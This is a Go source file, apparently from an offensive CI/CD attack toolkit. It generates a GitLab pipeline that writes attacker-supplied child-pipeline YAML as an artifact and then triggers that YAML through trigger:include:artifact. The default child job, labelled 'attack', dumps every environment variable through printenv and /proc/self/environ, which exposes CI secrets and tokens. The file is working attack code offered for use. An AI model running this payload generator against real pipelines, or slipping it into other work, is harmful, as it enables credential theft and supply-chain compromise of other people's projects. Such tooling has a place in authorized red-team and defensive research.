package payloads

import (
	"fmt"
	"strings"
)

// TriggerArtifactOptions configures a trigger:include:artifact poisoning payload.
type TriggerArtifactOptions struct {
	Common             CommonOptions
	MaliciousCIContent string // child pipeline YAML content
	ArtifactPath       string // artifact filename (default: "child-ci.yml")
	TriggerProject     string // downstream project path (optional)
	Strategy           string // depend|none (default: "depend")
}

// GenerateTriggerArtifactYAML generates a two-stage pipeline where stage 1
// writes malicious YAML as an artifact, and stage 2 triggers a child pipeline
// using that artifact via trigger:include:artifact.
func GenerateTriggerArtifactYAML(o TriggerArtifactOptions) string {
	name, _ := o.Common.defaults("trigger-artifact")
	if o.ArtifactPath == "" {
		o.ArtifactPath = "child-ci.yml"
	}
	if o.Strategy == "" {
		o.Strategy = "depend"
	}
	if strings.TrimSpace(o.MaliciousCIContent) == "" {
		o.MaliciousCIContent = defaultChildPipeline()
	}

	var b strings.Builder

	b.WriteString("stages: [build, deploy]\n\n")

	fmt.Fprintf(&b, `%s-generate:
  stage: build%s%s
  script:
    - |
%s
  artifacts:
    paths:
      - %s
  allow_failure: true

`, name, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(buildArtifactGenScript(o)), 6),
		o.ArtifactPath)

	fmt.Fprintf(&b, `%s:
  stage: deploy
  trigger:
    include:
      - artifact: %s
        job: %s-generate
    strategy: %s
`, name, o.ArtifactPath, name, o.Strategy)

	return b.String()
}

func defaultChildPipeline() string {
	return `stages: [attack]
child-exploit:
  stage: attack
  script:
    - printenv | sort
    - cat /proc/self/environ 2>/dev/null | tr '\0' '\n' || true
  allow_failure: true`
}

func buildArtifactGenScript(o TriggerArtifactOptions) string {
	return fmt.Sprintf(`cat > %s << 'CHILD_CI'
%s
CHILD_CI
echo "Child pipeline config written to %s"`, o.ArtifactPath, o.MaliciousCIContent, o.ArtifactPath)
}
